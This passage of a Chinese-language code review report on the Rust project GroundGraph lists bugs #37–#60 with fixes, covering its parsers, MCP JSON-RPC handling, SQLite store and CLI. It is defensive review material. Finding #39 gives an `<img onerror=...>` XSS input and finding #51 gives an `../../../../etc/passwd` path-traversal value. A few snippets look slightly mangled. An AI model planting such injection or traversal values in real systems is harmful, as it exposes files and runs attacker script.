- **建议**：在 `parse_class_header` 同级增加 enum/mixin/extension/typedef header 解析，或至少在 `update_depth` 之前用 `starts_with("enum ")` 等过滤；在 `parse_constructor` 中先 `trim_start_matches("factory ")`；在 `parse_field` 中显式拒绝以 `typedef` / `enum` / `mixin` / `extension` / `factory` 开头的行。

### 37. Dart 解析器不处理三引号字符串与字符串插值，跨行/插值 `}` 让深度计数严重失真

- **位置**：`crates/groundgraph-lang-dart/src/parser.rs:675-702`（`update_depth`）
- **问题**：`update_depth` 是**逐行**扫描（`for (idx, raw_line) in source.lines().enumerate()`），其内部状态 `in_string`、`quote_char` 在每行结束后**丢弃**。两个相关问题：
  1. **三引号跨行**：Dart `'''...'''` / `"""..."""` 允许跨多行，第一行进入字符串状态后行结束、状态丢失，后续两行的 `{` 与 `}` 被当作代码大括号处理，`depth` 漂移。
  2. **字符串插值 `${...}`**：Dart 单/双引号字符串支持插值 `"$var"` 与 `"${expr}"`，扫描器把整个 `"${...}"` 视为字符串跳过其中所有 `}`。但 Dart 单引号字符串内的 `(`、`{`、`;` 字面量在 `parse_method` 等函数中无预处理剥离，`var s = "foo(bar)"` 会被误判为方法声明。
- **触发场景**：Dart 源码含多行字符串字面量（JSON 模板、SQL 模板、Markdown 模板）或字符串插值——Flutter 项目中常见模式。
- **建议**：在 `parse_dart` 顶层维护跨行字符串状态机，把 `update_depth` 从"每行独立"改为"全文件 char 流扫描"；或在 `parse_method` / `parse_field` 入口先做 `strip_strings_and_comments` 预处理。
```rust
// parser.rs:675-702 现状：每行独立扫描
fn update_depth(line: &str, depth: &mut usize) {
    let mut in_string = false;  // ← 状态在每行重置
    // …
}
```

### 38. MCP `dispatch` 把"缺少 `id` 的请求"误判为 notification，违反 JSON-RPC 2.0

- **位置**：`crates/groundgraph-mcp/src/server.rs:61-80`，`crates/groundgraph-mcp/src/protocol.rs:36-53`
- **问题**：JSON-RPC 2.0 §4.1/§4.2 区分 Request（必须有 `id`）与 Notification（必须没有 `id`）。当前实现把"缺少 `id`"等价于"notification"，对二者**都不返回响应**。但若客户端发送一个意图为请求但忘记带 `id` 的消息（`{ "jsonrpc": "2.0", "method": "tools/list" }`），服务器静默丢弃，客户端永远等不到响应，连接挂起。

  更严重的合规问题：JSON-RPC 规范规定 `id: null` 时仍视为 Request，但 `Request::id` 用 `Option<Value>`，`Some(Value::Null)` 与缺失 `id` 通过 `serde(default)` 都映射到 `None`——`"id": null` 也被当作 notification 处理。同时**未校验 `jsonrpc == "2.0"`**，客户端发 `"jsonrpc": "1.0"` 也能被正常处理。
- **触发场景**：严格 JSON-RPC 客户端、用 `null` 作为 id 的客户端、客户端代码生成器忘记 emit `id` 字段时。
- **建议**：(1) 用 serde deserializer 区分"字段缺失"与"`null`"；(2) 对 `method` 非 notification 类型但 `id` 缺失返回 `INVALID_REQUEST`；(3) 在 `dispatch` 入口校验 `request.jsonrpc == "2.0"`。
```rust
// protocol.rs:36-53 现状
#[serde(default)]
pub id: Option<Value>,  // ← 字段缺失与 null 不可区分
pub fn is_notification(&self) -> bool {
    self.id.is_none()  // ← "id: null" 与缺 id 同样返回 true
}
```

### 39. `graph_html.rs` 多字段未转义注入 `innerHTML`（与第一批 #3 不同字段）

- **位置**：`crates/groundgraph-cli/src/commands/graph_html.rs:528, 551`
- **问题**：第一批 #3 记录了 `edgeRow` 的 `otherLabel` 未充分转义，但**同一文件其他渲染路径**仍未转义。`n.kind`（节点类型）、`e.layer`（边层级）等字段直接拼接进 `innerHTML`。GroundGraph 索引源代码注释、文档片段、MyBatis SQL 文本时，若这些字符串包含 `<img onerror=...>` 等 HTML 标签，会经 JSON payload 传到前端后被 `innerHTML` 渲染执行。
- **触发场景**：被索引的代码注释或文档中包含 HTML 片段（企业仓库、含示例 HTML 的 README、含 SQL 字符串的 mapper.xml）。
- **建议**：所有动态文本统一走 `textContent` 或 `escapeHtml()` 注入，建立"不允许任何 innerHTML 拼接未转义字段"的 lint 规则。

### 40. `dashboard` HTML 导出文件泄露宿主机绝对路径

- **位置**：`crates/groundgraph-cli/src/commands/dashboard.rs:99` 附近
- **问题**：导出的 HTML dashboard 把宿主机的绝对仓库路径（如 `/Users/qjs/Code/Projects/groundgraph/`）嵌入到 HTML payload 中（可能是 stats 引用、文件链接、源代码片段）。用户分享 dashboard（贴 issue、上传 CI artifact、发送给同事）即**无意泄露内部目录结构、用户名、组织结构**。这违反了 CONTRIBUTING.md "GroundGraph must never write outside `.groundgraph/`" 的非侵入精神外延——非侵入不仅指写入，也应包括"不外泄宿主信息"。
- **触发场景**：CI artifact 上传 dashboard HTML 到公开链；用户贴 dashboard 截图/源码到公开 issue。
- **建议**：在所有面向 HTML 的输出中只使用相对路径或仓库根 relative 形式（`./src/foo.rs`）；提供 `--redact-paths` 选项。

### 41. `clear_indexer_outputs` 不清理 `indexer IS NULL` 的节点（与第一批 #4 不同维度）

- **位置**：`crates/groundgraph-store/src/repositories.rs:444-478`
- **问题**：第一批 #4 记录的是 FTS 表的幽灵行；本条关注 nodes/edges 表的 `NULL` indexer 语义。删除条件 `DELETE FROM nodes WHERE indexer = ?1` 在 SQL 中遇到 `NULL` indexer 时永远不匹配——`NULL = 'dart_lightweight'` 求值为 `NULL`（不是 TRUE）。然而 `EdgeAssertion::declared` / `fact` 工厂默认 `indexer: None`，写入数据库即 `NULL`。结果：通过工厂构建但未显式设 indexer 的节点/边**永远无法被 `clear_indexer_outputs` 清除**。重索引时这些行残留，与"重置某 indexer 的输出"的语义相违。
- **触发场景**：任何用 `Node::new` / `EdgeAssertion::declared` 工厂构建但未显式设 indexer 的写入路径（包括 dart_lightweight 等历史 adapter），加上一次 `clear_indexer_outputs(same_name)` 后期望清理——结果残留所有未指派 indexer 的节点。
- **建议**：要么将 `indexer` 列改为 `NOT NULL DEFAULT '__unmanaged__'`；要么删除条件改为 `WHERE indexer IS ?1` 或 `WHERE indexer = ?1 OR indexer IS NULL`；或语义上明确"NULL indexer 表示未托管 → 应被任何 clear 清除"。
```rust
// repositories.rs:449
tx.execute("DELETE FROM nodes WHERE indexer = ?1", params![indexer])
//   ← indexer IS NULL 的行永远不被删除（NULL = ?1 → NULL ≠ TRUE）

// edge.rs:204-205 工厂创建的节点：
indexer: None,  // ← 写入即 NULL
```

### 42. `NodeKind::language()` 前缀匹配脆弱，且与 `language_of()` 对 `db_table`/`http_route` 给出不一致结果

- **位置**：`crates/groundgraph-core/src/node.rs:288-315` vs `crates/groundgraph-core/src/language_traits.rs:246`
- **问题**：函数把 `as_str()` 拆为语言前缀 + `_` + rest。但 `csharp_*` 前缀中含子串 `c`——目前因为列表里 `csharp` 在 `c` 之前而侥幸正确。任何新增 `cobra_*` / `c_factory_*` 这种字母前缀相互包含的语言都会被静默错配。更直接的是：`db_table` / `sql_mapper_stmt` / `http_route` 在 `NodeKind::language()` 返回 `None`，但 `language_traits.rs::language_of()` 中 `HttpRoute => Language::Synthetic`，`DbTable / SqlMapperStmt => Language::Generic`。**两个 API 对同一 NodeKind 给出语义不同结果**，调用方一旦混用即出现"看到 None 误判为非代码节点"的逻辑分叉。
- **触发场景**：UI 图例 / 搜索路由调用 `kind.language()`（方法）期待返回 `Some("http")` 或 `Some("sql")`，结果返回 `None`；而 `language_of(kind)`（自由函数）认为它们是 `Synthetic` / `Generic`。两个并存 API 必然被新代码误用。
- **建议**：要么删除 `NodeKind::language()` 让所有调用走 `language_of`（消除二义性）；要么补齐 `db_table` / `sql_mapper_stmt` / `http_route` 分支让两个 API 一致。前缀匹配改为 `(lang, "_")` 锚定完整 token。
```rust
// node.rs:309-314
.find(|lang| {
    s.strip_prefix(lang)
        .and_then(|r| r.strip_prefix('_'))  // ← 仅靠顺序保证 csharp≠c，脆弱
        .is_some()
})
// language_traits.rs:246
NodeKind::Route | NodeKind::Storage | NodeKind::HttpRoute => Language::Synthetic,
// ↑ NodeKind::HttpRoute.language() = None，但 language_of() = Synthetic — 不一致
```

### 43. `expand_subgraph` 无 depth 上限，用户 `--depth` 可触发无界图遍历（CLI 入口）

- **位置**：`crates/groundgraph-engine/src/search.rs:1738-1786`，配合 `crates/groundgraph-cli/src/commands/search.rs:67`（`depth: args.depth`）
- **问题**：第一批 #9 记录的是 MCP `get_subgraph` 的无界 BFS；本条关注**更广触发面**的 CLI 入口。`expand_subgraph` 用 `for _ in 0..depth` 做 BFS 扩展，每跳对 frontier 中每个 id 调用 `store.list_edges_from` 和 `store.list_edges_to`（两次 DB 往返）。`depth` 完全由 CLI 参数 `--depth` 决定，无任何上限校验。在密集图（spring-framework 84k 节点）上 `--depth 5` 即可访问百万级节点 × 2 次 DB 查询，产生分钟级延迟和 GB 级 `kept_edges: Vec` 内存增长。
- **触发场景**：`groundgraph search "foo" --depth 10` 在大型仓库上执行——比 MCP 调用更易触发（任何 CLI 用户即可）。
- **建议**：硬上限 `depth.min(MAX_DEPTH)`（如 3）；或为 `node_ids` / `kept_edges` 设硬容量上限，超出后停止扩展并 push 一条 `warnings`。
```rust
// search.rs:1750
for _ in 0..depth {  // ← depth 用户可控，无上限
    let mut next: BTreeSet<String> = BTreeSet::new();
    for id in &frontier {
        // 每个节点两次 DB 往返，所有边 push 进 kept_edges（无去重容量）
```

---

## Medium（16 个）

### 44. 路径参数形式（`{id}` / `:id` / `<id:int>` / `${id}` / `%s`）未做统一规范化

- **位置**：`crates/groundgraph-engine/src/schema_indexer.rs:3334-3349`（`normalize_route`）、`3353-3360`（`route_search_name`）、`3105-3111`（`normalize_consumed_route_path`）
- **问题**：Spring `/users/{id}`、Gin `/users/:id`、ASP.NET `/users/{id:int}`、Flask `/users/<int:id>`、FastAPI `/users/{id:int}`、TS `${id}`、C printf `%s` 各自保留原形式。`route_search_name` 只跳过 `{var}` 开头段，对 `:id` / `<id>` 返回 `:id` 作为节点 `name`——搜索 "getUserById" 无法匹配。多语言混合仓库里同一接口的两个客户端调用可能产生两个互不合并的节点。
- **触发场景**：一个仓库 Spring 端 `GET /u/{id}` + Gin 端转发 `GET /u/:id`：两次索引产出两个 `HttpRoute` 节点，`name` 分别为 `{id}` 与 `:id`。
- **建议**：在 `normalize_route` 末尾或专用函数里把每个段里的参数占位符折叠为 `:param`。

### 45. FastAPI / Flask 的 `APIRouter(prefix=...)` / `Blueprint(url_prefix=...)` 前缀完全未传播

- **位置**：`crates/groundgraph-engine/src/schema_indexer.rs:2152-2192`（`parse_python_routes`）
- **问题**：仅 Java 类级 `@RequestMapping` 与 Go `Gin.Group()` 解析前缀，Python 的 `APIRouter(prefix="/api/v1", ...)` / `Blueprint(url_prefix=...)` / `app = FastAPI(root_path=...)` 都被忽略。`@router.get("/users")` 直接索引为 `/users`，而实际服务路径是 `/api/v1/users`。
- **触发场景**：FastAPI 项目 `r = APIRouter(prefix="/api/v1"); @r.get("/users")` → 索引路径 `/users`，与客户端 `/api/v1/users` 不匹配，跨图链接失败。
- **建议**：仿照 `collect_gin_group_prefixes` 写一个 `collect_python_router_prefixes`，扫描 `APIRouter(prefix=...)` / `Blueprint(url_prefix=...)` 赋值。

### 46. `skip_python_string` 三引号关闭条件 `i + 2 < b.len()` 在文件末尾少读一字节

- **位置**：`crates/groundgraph-engine/src/schema_indexer.rs:2228-2244`
- **问题**：第 2230 行检测开三引号用 `start + 2 < b.len()`（严格小于），第 2238 行检测关三引号同样 `i + 2 < b.len()`。当关闭的 `"""` 正好位于文件末尾（即 `i == b.len() - 3`）时，`i + 2 < b.len()` 为假，**关闭符不被识别**，循环跑到 `b.len()` 后返回，`python_decorator_offsets` 把 docstring 后面的代码当作仍在字符串里跳过 —— 一段代码末尾的 docstring 后所有 `@decorator` 都被丢弃，**漏索引真实路由**。
- **触发场景**：Python 文件以三引号字符串结尾（如模块级 `"""..."""`），或文件末尾的 docstring 之后还有 import 但没 `@`。
- **建议**：把严格 `<` 改为 `<=`（即 `i + 3 <= b.len()`），并加边界检查。
```rust
if b[i] == q
    && i + 2 < b.len()              // 旧：少一字节
    && b[i + 1] == q && b[i + 2] == q {
// 改为：
if i + 3 <= b.len() && b[i] == q && b[i + 1] == q && b[i + 2] == q {
```

### 47. `similarity::normalize` 未折叠 Unicode 标识符，破坏结构指纹一致性

- **位置**：`crates/groundgraph-engine/src/similarity.rs:651-668, 720-731`（`consume_identifier`）
- **问题**：`consume_identifier` 只接受 ASCII alphanumeric + `_`。遇到 Rust/Swift/Kotlin/Dart 的 Unicode XID 标识符（如 `用户_count`、`α_β`、`count用户`）时，`用`/`户` 走 fallback `out.push(c.to_string())`，每个非 ASCII 字符成为独立单字符 token。结果：`def 用户():` 标准化为 `[def, 用, 户, (, )]`，与 `def 其他():` 结构相同（因为 `用`/`户`/`其`/`他` 都是独立 token）；`用户_id` 与 `_id`（无 Unicode）标准化的 token 数不同，结构对比失真。**手写扫描器必须 total 且确定性的基线被违反**。
- **触发场景**：源码含中文/日文/韩文/希腊字母标识符——GroundGraph 中文用户场景常见。
- **建议**：把 `consume_identifier` 的字符判据改为 `c.is_alphanumeric() || c == '_'`（Unicode-aware），然后像 ASCII 标识符一样折叠为 `ID`。

### 48. `dart_sidecar::try_run` 用 `wait_with_output` 全量缓冲 stdout，无超时；解析单条记录失败则丢弃整批

- **位置**：`crates/groundgraph-engine/src/dart_sidecar.rs:138-187`（`try_run`）、`304-355`（`parse_response`）
- **问题**：
  1. `child.wait_with_output()` 一次性把 sidecar 全部 stdout 读入 `Vec<u8>`，大型 Flutter 仓库（如 Flutter gallery，50k+ 符号）可能产出数百 MB JSON，内存峰值极高。
  2. **无超时控制**：sidecar 死锁（如 Dart analyzer 等待 stdin EOF 但 groundgraph 已 `drop(stdin)` 后又出错）会让 `wait_with_output` 永远阻塞，整条 `groundgraph index` 卡死。
  3. `parse_response` 在循环中遇到单条记录反序列化失败（如 sidecar 升级后字段不兼容）立即返回 `Skipped` —— 已成功解析的 9999 条记录被全部丢弃，违反部分恢复原则。
- **触发场景**：sidecar 版本不匹配，第 5 条 symbol 字段新增 `deprecated` 字段，前 4 条已 push 到 batch，第 5 条 `from_value` 报错 → 整批丢弃 → Dart 索引"全部缺失"而非"95% 缺失"。
- **建议**：(a) 用带超时的 `wait` + 流式读 stdout；(b) `parse_response` 对单条失败计入 warning 计数并 `continue`。
```rust
for v in response.symbols {
    match serde_json::from_value(v) {
        Ok(s) => batch.symbols.push(s),
        Err(_) => { invalid_count += 1; continue; } // 不再整体返回
    }
}
```

### 49. `concat_string_literals` 对 Go 字符串转义 `\xNN`/`\uXXXX`/`\n` 误还原为原始字符

- **位置**：`crates/groundgraph-engine/src/schema_indexer.rs:2419-2450`
- **问题**：第 2428-2431 行：遇到 `\` 就把"下一个字节"作为字符 push。对于 Go 路由 `mux.HandleFunc("GET /api\\n", h)`（路径里包含字面反斜杠+n）会被还原成 `/apin`，丢失反斜杠。对 `中`（中文字面）只取 `u` 字符。`\x2f`（斜杠转义）只取 `x`。结果：路由路径被篡改，节点 ID 与实际不匹配，跨图链接失败。
- **触发场景**：Go 测试 fixture 路由 `"GET /v\\x2f1"` → 实际路径 `/v/x1`，索引成 `/v x1`（取 `\` 后的 `x`）。
- **建议**：要么如实保留反斜杠+下一字节，要么真正解码 Go 字符串转义；简化方案是不做转义还原，遇到 `\` 直接跳两字节不 push。
```rust
b'\\' => { j += 2; continue; } // 跳过转义序列但不污染输出
```

### 50. `simple_glob_match` 递归回溯，对 `**/**/foo/**` 类病态模式呈指数级耗时

- **位置**：`crates/groundgraph-engine/src/lsp_indexer.rs:915-971`（被 `treesitter.rs:1946-1950` 的 `discover_files` exclude 过滤调用）
- **问题**：`simple_glob_match` 在遇到 `**` 时对 `txt[ti..]` 的**每个后缀**递归调用 `glob_match_rec`。当模式含多个连续 `**`（如用户在 `.groundgraph.yaml` 的 `code.exclude` 写 `**/**/foo/**`），每个 `**` 都枚举所有切点并递归，组合爆炸——对一条长路径（如 `a/b/c/d/e/f/g.swift`）匹配耗时可达指数级。`discover_files` 对**每个发现的源文件** × **每条 exclude glob** 调用此函数，一条病态 glob 即可让 `groundgraph index` 在 84k 文件仓库上耗时数十分钟甚至卡死。
- **触发场景**：用户在 `.groundgraph.yaml` 配置含多个 `**` 的 exclude glob（合法且常见，如 `**/generated/**`）。
- **建议**：改用 `globset` crate（项目已用，见 `port_coverage.rs:25`、`dead_code.rs:37`）替代手写匹配器；或对连续 `*` 折叠为单个 `*`/`**`；或将 `**` 转换为 NFA 而非回溯。
```rust
// lsp_indexer.rs:934-938
for j in ti..=txt.len() {
    if glob_match_rec(pat, next, txt, j) {  // ← 对每个 j 全递归
        return true;
    }
}
```

### 51. `attach_snippets` 直接 `repo_root.join(&m.path)` 读文件，无路径遍历校验、无文件大小上限

- **位置**：`crates/groundgraph-engine/src/search.rs:576-625`（具体在 590-594）
- **问题**：`attach_snippets` 把数据库 `nodes.path` 字段直接拼到 `repo_root`，然后 `std::fs::read_to_string`。三种风险：
  1. **非 UTF-8 文件**：`read_to_string` 在 Latin-1/GBK 源文件上返回 `Err`，整个 match 的 snippet 静默丢失（`let Some(lines) = lines else { continue }`）。
  2. **路径遍历**：若数据库被人工编辑或 indexer bug 导致 `path = "../../../../etc/passwd"`，`repo_root.join` 不阻止 `..`，会读到仓库外的文件（虽然只读，但违反非侵入精神，snippet 内容会泄露到搜索结果）。
  3. **超大文件**：`read_to_string` 把整个文件读入内存。一个被索引的 50MB 自动生成 `.g.dart` 文件会让单次 `attach_snippets` 分配 50MB `String` + `Vec<String>`（每行一个 String）。
- **触发场景**：仓库包含自动生成的大文件（`*.g.dart`、`*.pb.go`），或非 UTF-8 源文件。
- **建议**：先 `metadata` 校验大小（< 1MB 才读）；用 `fs::read` + `String::from_utf8_lossy` 容忍非 UTF-8；校验规范化后的路径仍在 `repo_root` 之下（`canonicalize` + `starts_with`）。
```rust
// search.rs:590-594
let lines = cache.entry(path.clone()).or_insert_with(|| {
    std::fs::read_to_string(repo_root.join(&path))  // ← 无大小检查、无路径校验
        .ok()
        .map(|c| c.lines().map(String::from).collect())
});
```

### 52. `tokenise_keywords` 用 `is_alphanumeric()` 分词，CJK 标识符产 huge tokens，结构层中文搜索严重受限

- **位置**：`crates/groundgraph-engine/src/search.rs:1261-1274`
- **问题**：`tokenise_keywords` 按 `!c.is_alphanumeric() && c != '_'` 分割。Unicode `is_alphanumeric` 包括所有 CJK 字符，所以中文查询 `"用户登录服务"` 被当作**单个 token** 而非四个词。后续 `keyword_matches` → `score_node` 用该 token 对 node.name/id 做 `contains` 子串匹配。意味着只有名字里**完整连续**包含 `用户登录服务` 的节点才命中；用户输入 `登录 服务` 反而匹配不到 `用户登录服务模块` 节点。FTS 内容层用 `fts_query_tokens`（CJK bigram）补救了正文匹配，但**结构层**（node 名字/id/path）的中文搜索严重受限。
- **触发场景**：用户用中文关键词搜索中文项目（GroundGraph 主要面向中文用户）。
- **建议**：`tokenise_keywords` 在 ASCII 字符处分割后，对 CJK run 进一步用 bigram 切分（复用 `fts_text::fts_tokens` 或独立 CJK 分词）。

### 53. `slugify` 对全非 ASCII 字符串返回 `"section"`，导致中文/日文章节 ID 全部冲突

- **位置**：`crates/groundgraph-core/src/artifact_id.rs:93-113`
- **问题**：当输入文本不含任何 ASCII 字母数字（例如纯中文标题 `"自动水印放置"`），输出回退为 `"section"`。多个中文 doc section 的 slug 全部塌缩为 `"section"`，于是 `doc_section_id("docs/a.md", "section")` 对所有中文小节返回相同 ID `docsec::docs/a.md#section`。这破坏了 ArtifactId 的"确定性 + 唯一性"约定：所有中文小节在 `nodes` 表里互相覆盖（`ON CONFLICT(id) DO UPDATE`），FTS 搜索只能找到最后一个。
- **触发场景**：任何纯中文 / 纯日文 / 纯韩文 / 纯 emoji 标题——GroundGraph 主打中文用户场景，触发概率极高。
- **建议**：fallback 不要用固定字符串，而是用输入的 hash（如 FNV-1a 64 位 hex）或保留原字符的 NFC 形式。
```rust
// artifact_id.rs:108-112
if out.is_empty() {
    "section".to_string()  // ← 多个不同中文标题都映射到此，ID 冲突
} else {
    out
}
```

### 54. `rebuild_fulltext` 用未缓存 `prepare` + 一次一行 INSERT，大型 ingest 数秒浪费

- **位置**：`crates/groundgraph-store/src/repositories.rs:530-548`
- **问题**：(1) `tx.prepare("INSERT INTO node_fts ...")` 在事务内手动准备，与同模块其他写入路径明确强调的 `prepare_cached` 基线相违。(2) 循环中一次一行 `execute`，而非 multi-row VALUES；84k 行等于 84k 次 VDBE dispatch。对比 `upsert_nodes_bulk` 已用 512 行 chunk，此处是显著的退化点。
- **触发场景**：每次 `groundgraph index` 全量重建 FTS——对 django (96k symbols) / spring (84k) 这类大仓，单次 index 多花数秒在 dispatch 上。
- **建议**：用 `prepare_cached` + 512-行 VALUES chunk，与 `upsert_nodes_bulk` 对齐。
```rust
// repositories.rs:535-545
let mut stmt = tx
    .prepare("INSERT INTO node_fts (node_id, body) VALUES (?1, ?2)")  // ← 非 cached
    .map_err(StoreError::sqlite)?;
for row in rows {
    if row.body.trim().is_empty() { continue; }
    stmt.execute(params![row.node_id, row.body])  // ← 一次一行，84k+ dispatch
        .map_err(StoreError::sqlite)?;
}
```

### 55. `commit_bulk` 后未恢复 `wal_autocheckpoint` 的失败语义：异常路径残留 0

- **位置**：`crates/groundgraph-store/src/lib.rs:176-185`
- **问题**：`commit_bulk` 执行 `COMMIT; PRAGMA wal_checkpoint(TRUNCATE); PRAGMA wal_autocheckpoint=1000;` 一连串语句在单个 `execute_batch` 中。如果 `wal_checkpoint(TRUNCATE)` 因任何原因失败（如只读文件系统、磁盘满），`execute_batch` 整体返回错误，但 `COMMIT` 已经执行（SQLite `execute_batch` 是顺序执行，COMMIT 不可撤销）。后果：事务已提交但 `wal_autocheckpoint=1000` 没有恢复（停留在 `begin_bulk` 设的 `0`），后续连接的所有 WAL 累积直到下次显式 checkpoint，**WAL 文件无界增长**。
- **触发场景**：CI 上 WAL 体积监控 / 长跑 daemon / 磁盘空间紧张时 checkpoint 失败但 commit 已完成——非常隐蔽，WAL 静默膨胀。
- **建议**：把 `COMMIT` 单独 `execute_batch`，再单独执行 PRAGMA，PRAGMA 失败时仅记日志不影响 commit 结果；或在 commit 前先把 `wal_autocheckpoint` 重置为 1000，再 commit，再 checkpoint。
```rust
// lib.rs:179-182
self.conn.execute_batch(
    "COMMIT; PRAGMA wal_checkpoint(TRUNCATE); PRAGMA wal_autocheckpoint=1000;",
    // ← 若 checkpoint 失败：commit 已生效但 autocheckpoint 永久为 0
)
```

### 56. Dart `strip_strings_and_comments` 不处理块注释 `/* ... */`，块注释内标识符被当真实引用产生假边

- **位置**：`crates/groundgraph-lang-dart/src/references.rs:361-394`
- **问题**：函数只识别**行注释** `//`（line 379-381），完全不处理 **块注释** `/* ... */`。结果：`/* IapProductIds is used here */` 中的 `IapProductIds` 不被剥离，`scan_identifiers` 把它当作真实引用、查到符号索引中存在的 `IapProductIds` 类后，**发出一条虚假的 `references` 边**。`compute_references` 在所有方法体上跑——任何含块注释提及类名/方法名的源文件都会产生假边。
- **触发场景**：源码方法体中含块注释提及类名（很常见——版权头、解释性注释、被注释掉的代码片段）。
- **建议**：在 `strip_strings_and_comments` 中跟踪 `in_block_comment` 状态（同时处理块注释跨多行的情况——需要在外层维护状态）。
```rust
// references.rs:379-381 现状
if c == b'/' && i + 1 < bytes.len() && bytes[i + 1] == b'//' {
    break;  // ← 仅处理 //，未处理 /*
}
```

### 57. MCP 不支持 JSON-RPC 批量请求 `[ {...}, {...} ]`，违反规范

- **位置**：`crates/groundgraph-mcp/src/server.rs:35-57, 61-80`
- **问题**：JSON-RPC 2.0 规范 §6 明确允许**批量请求**——客户端可发送一个 JSON 数组 `[{...}, {...}]`，服务器应答一个数组。当前 `dispatch` 用 `serde_json::from_str::<Request>(raw)` 解析，遇到数组会直接失败并返回 PARSE_ERROR（id 为 null）——客户端永远收不到批量内任何子请求的响应。即使主流 MCP 客户端（Cursor、Claude Desktop）当前不使用批量，规范合规性仍是 GroundGraph 这种"提供标准 MCP 服务"的工具应当满足的；支持批量请求的客户端连接后整个会话无法启动。
- **触发场景**：合规的 JSON-RPC 客户端、或并发优化客户端使用批量提交多个 `tools/call`。
- **建议**：在 `pump` 中先尝试解析为 `Vec<Request>`，回退到单 `Request`；批量输入按"对每个子项调用 `dispatch`，聚合非 None 结果为数组"。

### 58. `--json` 隐式 flag 静默覆盖 `--format`，对运维脚本是常见陷阱

- **位置**：`crates/groundgraph-cli/src/main.rs:1103-1108, 1227-1248`
- **问题**：分发逻辑执行 `let format = if args.json { SearchFormat::Json } else { args.format.into_command_format() };`——因此 `groundgraph search foo --format html --json` 会静默切换到 JSON 输出（忽略 HTML 请求）。`--json` 和 `--format` 都有 clap 文档字符串，但都没声明排他性，clap group 验证未连接。`--format text --json` 也会静默生成 JSON。同样的模式在 `ImpactArgs`（`main.rs:1103-1108`）重复。运维人员传 `--json` 期望"详细模式"却得到机器输出，反之亦然——CI 脚本静默错误。
- **触发场景**：CI 脚本逐步演化，先加 `--format text`，后来加 `--json` 调试，二者同时存在即出错。
- **建议**：用 `#[arg(conflicts_with = "format")]` 设置互斥；或保留 `--json` 兼容但发出 deprecation 警告。
```rust
if args.json && !matches!(args.format, SearchFormatArg::Json) {
    eprintln!("warn: --json overrides --format {}; dropping --json in a future release", ...);
}
```

### 59. `propose` Markdown 输出 `mermaid_id` 未充分 sanitize，模块 id 含 `/`/`.` 会破坏 Mermaid 语法

- **位置**：`crates/groundgraph-cli/src/commands/propose.rs:106-139, 176-180`
- **问题**：`mermaid_id(&m.id)` 当前实现（如有）可能未充分 sanitize，若 `m.id` 来自目录路径含 `/`（如 `"lib_v2/auth"`）、`.`、空格或特殊字符，斜杠会原封不动落入 Mermaid 节点 id `lib_v2/auth`，破坏 Mermaid 解析。同时，AI 提示词被包裹在 ` ```text ` / ` ``` ` 中（第 178-180 行），若 `pack.prompt` 本身包含 ` ``` `（自定义提示词或多行字符串），Markdown 解析器会过早关闭外部代码块并破坏文档其余部分。引擎通过模板构建 `pack.prompt`，目前安全，但**未强制不变性**。
- **触发场景**：业务模块 id 来源于目录路径（如 `lib_v2/auth`）；或扩展 pack.prompt 模板时引入反引号。
- **建议**：把 `mermaid_id` 严格 sanitize 为 `[A-Za-z0-9_]+`；用四反引号围栏 ` ```` ` 作为外部块以容忍内部三反引号。
```rust
fn mermaid_id(slug: &str) -> String {
    let mut out = String::new();
    for ch in slug.chars() {
        if ch.is_ascii_alphanumeric() || ch == '_' { out.push(ch); } else { out.push('_'); }
    }
    out
}
```

---

## Low（1 个）

### 60. Dart `disambiguate_duplicate_test_ids` 是 O(N²)，大型 test 套件性能退化

- **位置**：`crates/groundgraph-lang-dart/src/parser.rs:572-594`
- **问题**：函数对 `tests` 数组中的每个元素，再次遍历整个 `tests` 数组做去重计数（`tests.iter().filter(... candidate ...).count()`）。`tests.len()` 在大型 Flutter 测试套件中可达数千（一个 `*_test.dart` 文件常含 200+ `test(...)`，单批 index 处理上百个测试文件 → 数万 test），总复杂度 O(N²) 可达 10⁸–10⁹ 级。此外每个 idx 的 `slug` 都被重复计算（外层 `slugify` 与内层 `slugify(&candidate.name)` 多次计算同一字符串）。
- **触发场景**：批量索引一个含数百个测试文件的大型 Flutter 仓库。
- **建议**：预计算一次 `HashMap<(TestKind, path, slug), count>`，再单次遍历做重命名。
```rust
// parser.rs:573-582
for idx in 0..tests.len() {
    let slug = slugify(&tests[idx].name);
    let duplicate_count = tests
        .iter()
        .filter(|candidate| {  // ← O(N) 内嵌在 O(N) 循环里
            // …
        })
        .count();
```

---

## 审查统计

| 严重度 | 数量 |
|---|---|
| High | 13 |
| Medium | 16 |
| Low | 1 |
| **合计** | **30** |

按模块分布：

| 模块 | 问题数 |
|---|---|
| groundgraph-engine（schema_indexer / 路由 / scip_runner / lsp_client / search / dart_sidecar / index / stats） | 16 |
| groundgraph-store（repositories / lib / artifact_id） | 5 |
| groundgraph-lang-dart（parser / references） | 4 |
| groundgraph-cli（commands / main） | 4 |
| groundgraph-mcp（server / protocol） | 2 |
| groundgraph-core（node / language_traits） | 2 |

按主题聚类：

| 主题 | 涉及条目 |
|---|---|
| **路由/HTTP 跨图链接正确性**（ID 规范化、参数折叠、前缀传播） | #31、#44、#45、#49 |
| **手写扫描器的字符串/注释边界**（三引号、插值、块注释、Unicode 标识符） | #37、#46、#47、#56 |
| **资源耗尽 / DoS**（Content-Length、glob 回溯、attach_snippets、depth BFS） | #32、#43、#50、#51 |
| **事务/索引一致性**（NULL indexer、checkpoint、FTS 重建、全有或全无） | #33、#34、#41、#54、#55 |
| **协议合规**（JSON-RPC id/batch、MCP） | #38、#57 |
| **中文用户场景**（slugify 塌缩、CJK 分词、Unicode 标识符） | #47、#52、#53 |
| **CLI/UX 陷阱**（--json 覆盖、mermaid_id、dashboard 泄露、stats 并发） | #35、#39、#40、#58、#59 |

**核心结论（与第一批 issues.md 互补）**：

- **最值得优先修复**的 5 个：#31（路由跨图断链，破坏 P0 索引价值）、#34（全有或全无事务，单 indexer 失败导致分钟级回滚 + 全量重跑）、#35（stats 并发损坏，CI 流水线数据完整性）、#36（Dart enum/mixin/factory 不识别，Flutter 项目几乎必触发）、#38（MCP 协议合规，严格客户端无法启动会话）。

- **路由处理是系统性的弱点**：第一批的 #10/#11（schema_indexer Java entity / balanced_parens 字符串字面量）+ 本批 #31/#44/#45/#49 揭示了**整个跨语言 HTTP 路由索引管道**存在多个独立缺陷——服务端 ID 与客户端 ID 不匹配（#31）、参数占位符 5 种形式未规范化（#44）、Python router 前缀未传播（#45）、Go 字符串转义误还原（#49）。这 4 个问题任意一个都会让 HTTP 端到端 Calls 边断裂，建议作为一个 epic 统一修复并加 e2e 测试。

